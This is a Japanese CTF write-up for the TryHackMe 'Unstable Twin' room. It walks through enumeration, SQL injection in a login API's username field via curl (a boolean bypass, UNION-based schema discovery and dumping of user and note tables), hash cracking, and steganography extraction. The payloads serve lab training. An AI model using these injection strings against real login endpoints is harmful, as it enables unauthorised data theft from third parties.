# Unstable Twin CTF

https://tryhackme.com/room/unstabletwin

## Enumeration

```shell
TARGET=10.65.133.184
sudo bash -c "echo $TARGET   twin.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- --min-rate 10000 $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    nginx 1.14.1
```

SSH, HTTPのみ。

### ディレクトリ列挙

/info を発見。

```sh
dirb http://$TARGET

---- Scanning URL: http://10.65.133.184/ ----
+ http://10.65.133.184/info (CODE:200|SIZE:160)                                                                      
                                                                                                                     
-----------------
```

/info。login API の存在とフィールド名を示唆している。

```http
HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Fri, 28 Nov 2025 01:17:23 GMT
Content-Type: application/json
Content-Length: 160
Connection: keep-alive
Build Number: 1.3.4-dev
Server Name: Vincent

"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
```

VHOSTを調べると、コンテンツ長160以外に、148のものも多数出てくる。  
http://apple.twin.thm/info などではバージョンが異なる。サーバー名も。

```http
HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Fri, 28 Nov 2025 01:21:38 GMT
Content-Type: application/json
Content-Length: 148
Connection: keep-alive
Build Number: 1.3.6-final
Server Name: Julias

"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
```

148, 160 以外を返すVHOSTは存在しなかった。

```sh
ffuf -u http://twin.thm/info -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.twin.thm' -fs 148,160
```

`新しいバージョンのコードをデプロイしたところですが、Vincent がデプロイを失敗してしまいました` というルームの説明文から、`1.3.6-final` の方に問題があると想定する。

## login API

/api/login に対してPOSTすると、応答があった。

```sh
$ curl -v http://apple.twin.thm/api/login -X POST -d 'username=admin&password=test'
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host apple.twin.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.65.133.184
*   Trying 10.65.133.184:80...
* Connected to apple.twin.thm (10.65.133.184) port 80
* using HTTP/1.x
> POST /api/login HTTP/1.1
> Host: apple.twin.thm
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 28 bytes
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Fri, 28 Nov 2025 01:31:07 GMT
< Content-Type: application/json
< Content-Length: 51
< Connection: keep-alive
< 
"The username or password passed are not correct."
* Connection #0 to host apple.twin.thm left intact
```

sqlmap を実行したが、脆弱性は見つからなかった。

/api/login 以外のエンドポイントは見つからなかった。

```sh
root@ip-10-65-64-98:~# ffuf -u http://apple.twin.thm/api/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -X POST -d 'dummy' -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://apple.twin.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : dummy
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

login                   [Status: 200, Size: 51, Words: 8, Lines: 2]
:: Progress: [4655/4655] :: Job [1/1] :: 1627 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

全く同じリクエストを送っても、`"The username or password passed are not correct."` が返ったり、`[]` が返ったりして安定しない。この点がルーム名の「不安定な双子」に関係していると思われる。

ここで勘違いに気付いた。バージョンの違いはVHOSTではなく、リクエストごとに交互に代わっている。おそらく、`1.3.4-dev` のタイミングを狙って攻撃しなければならない。

```sh
$ curl -v http://twin.thm/info                                                                                                                 
* Host twin.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.65.133.184
*   Trying 10.65.133.184:80...
* Connected to twin.thm (10.65.133.184) port 80
* using HTTP/1.x
> GET /info HTTP/1.1
> Host: twin.thm
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Fri, 28 Nov 2025 02:11:23 GMT
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: 1.3.4-dev
< Server Name: Vincent
< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host twin.thm left intact
```

```sh
$ curl -v http://twin.thm/info
* Host twin.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.65.133.184
*   Trying 10.65.133.184:80...
* Connected to twin.thm (10.65.133.184) port 80
* using HTTP/1.x
> GET /info HTTP/1.1
> Host: twin.thm
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Fri, 28 Nov 2025 02:11:27 GMT
< Content-Type: application/json
< Content-Length: 148
< Connection: keep-alive
< Build Number: 1.3.6-final
< Server Name: Julias
< 
"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host twin.thm left intact
```

username に、SQLiの脆弱性を発見した。

```sh
$ curl -v http://twin.thm/api/login -X POST -d "username=julias' or 1=1-- -" -H 'Content-Type: application/x-www-form-urlencoded'

[
  [
    2, 
    "julias"
  ], 
  [
    4, 
    "linda"
  ], 
  [
    5, 
    "marnie"
  ], 
  [
    1, 
    "mary_ann"
  ], 
  [
    3, 
    "vincent"
  ]
]
```

列数は２。

```sh
$ curl -v http://twin.thm/api/login -X POST -d "username=julias' union select 1,2-- -" -H 'Content-Type: application/x-www-form-urlencoded'

[
  [
    1, 
    2
  ], 
  [
    2, 
    "julias"
  ]
]
```

DBMS は SQLite と判明。テーブル名判明。

```sh
$ curl -v http://twin.thm/api/login -X POST -d "username=julias' union select tbl_name,2 FROM sqlite_master WHERE type='table'--" -H 'Content-Type: application/x-www-form-urlencoded'

[
  [
    2, 
    "julias"
  ], 
  [
    "notes", 
    2
  ], 
  [
    "sqlite_sequence", 
    2
  ], 
  [
    "users", 
    2
  ]
]
```

usersテーブルの定義

```sh
$ curl -v http://twin.thm/api/login -X POST -d "username=julias' union select sql,2 FROM sqlite_master WHERE type<>'meta' AND sql NOT NULL AND name ='users'--" -H 'Content-Type: application/x-www-form-urlencoded'

[
  [
    2, 
    "julias"
  ], 
  [
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)", 
    2
  ]
]
```

notesテーブルの定義

```sh
$ curl -v http://twin.thm/api/login -X POST -d "username=julias' union select sql,2 FROM sqlite_master WHERE type<>'meta' AND sql NOT NULL AND name ='notes'--" -H 'Content-Type: application/x-www-form-urlencoded'

[
  [
    2, 
    "julias"
  ], 
  [
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)", 
    2
  ]
]
```

usersテーブルデータ

```sh
$ curl -v http://twin.thm/api/login -X POST -d "username=julias' union select username,password FROM users--" -H 'Content-Type: application/x-www-form-urlencoded'

[
  [
    2, 
    "julias"
  ], 
  [
    "julias", 
    "Red"
  ], 
  [
    "linda", 
    "Green"
  ], 
  [
    "marnie", 
    "Yellow "
  ], 
  [
    "mary_ann", 
    "continue..."
  ], 
  [
    "vincent", 
    "[REDACTED]"
  ]
]
```

notesテーブルデータ。ハッシュはおそらく SHA-512。

```sh
─$ curl -v http://twin.thm/api/login -X POST -d "username=julias' union select user_id,notes FROM notes--" -H 'Content-Type: application/x-www-form-urlencoded'

[
  [
    1, 
    "I have left my notes on the server.  They will me help get the family back together. "
  ], 
  [
    1, 
    "My Password is eaf06[REDACTED]\n"
  ], 
  [
    2, 
    "julias"
  ]
]
```

このハッシュは、オンラインでクラックできた。  
https://10015.io/tools/sha512-encrypt-decrypt

## 権限昇格

```sh
[mary_ann@UnstableTwin ~]$ ls -al
total 24
drwx------. 3 mary_ann mary_ann 138 Feb 13  2021 .
drwxr-xr-x. 3 root     root      22 Feb 13  2021 ..
-rw-------. 1 mary_ann mary_ann 115 Feb 13  2021 .bash_history
-rw-r--r--. 1 mary_ann mary_ann  18 Jul 21  2020 .bash_logout
-rw-r--r--. 1 mary_ann mary_ann 141 Jul 21  2020 .bash_profile
-rw-r--r--. 1 mary_ann mary_ann 424 Feb 13  2021 .bashrc
drwx------. 2 mary_ann mary_ann  44 Feb 13  2021 .gnupg
-rw-r--r--. 1 mary_ann mary_ann 219 Feb 13  2021 server_notes.txt
-rw-r--r--. 1 mary_ann mary_ann  20 Feb 13  2021 user.flag
```

画像を集める必要がある？

```sh
[mary_ann@UnstableTwin ~]$ cat server_notes.txt 
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
```

/opt/unstabletwin でそれらしい画像ファイル等を発見。

```sh
[mary_ann@UnstableTwin unstabletwin]$ pwd
/opt/unstabletwin
[mary_ann@UnstableTwin unstabletwin]$ ls -al
total 628
drwxr-xr-x. 3 root root    288 Feb 13  2021  .
drwxr-xr-x. 3 root root     26 Feb 13  2021  ..
-rw-r--r--. 1 root root  40960 Feb 13  2021  database.db
-rw-r--r--. 1 root root   1214 Feb 13  2021  main_5000.py
-rw-r--r--. 1 root root   1837 Feb 13  2021  main_5001.py
drwxr-xr-x. 2 root root     36 Feb 13  2021  __pycache__
-rw-r--r--. 1 root root    934 Feb 13  2021  queries.py
-rw-r--r--. 1 root root 320277 Feb 10  2021 'Twins (1988).html'
-rw-r--r--. 1 root root  56755 Feb 13  2021  Twins-Arnold-Schwarzenegger.jpg
-rw-r--r--. 1 root root  47303 Feb 13  2021  Twins-Bonnie-Bartlett.jpg
-rw-r--r--. 1 root root  50751 Feb 13  2021  Twins-Chloe-Webb.jpg
-rw-r--r--. 1 root root  42374 Feb 13  2021  Twins-Danny-DeVito.jpg
-rw-r--r--. 1 root root  58549 Feb 13  2021  Twins-Kelly-Preston.jpg
```

5つのjpegファイルから、stegseek でそれぞれ隠しファイルを取り出せた。

```sh
$ stegseek ./Twins-Danny-DeVito.jpg                                        
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "vincent.txt".
[i] Extracting to "Twins-Danny-DeVito.jpg.out".
```

レインボーに並べ替えるとは？

```sh
$ cat ./Twins-Bonnie-Bartlett.jpg.out      
You need to find all my children and arrange in a rainbow!
```

赤橙黄緑青藍紫で並べる。

```sh
$ cat ./Twins-Arnold-Schwarzenegger.jpg.out 
Red - 1DV[REDACTED]
```

```sh
$ cat Twins-Danny-DeVito.jpg.out 
Orange - PS0[REDACTED]
```

```sh
$ cat ./Twins-Kelly-Preston.jpg.out
Yellow - jKLN[REDACTED]
```

```sh
$ cat ./Twins-Chloe-Webb.jpg.out     
Green - eVYv[REDACTED]
```

この順番でつなげて、Base62デコードするとフラグが出てきた。

## 振り返り

- ごく単純なSQLインジェクションだが、sqlmap が検出できないパターン。
- 何かの作品をモチーフにしたCTFは元ネタを知らないと最後までよくわからないまま終わる。

## Tags

#tags:SQLインジェクション #tags:puzzle
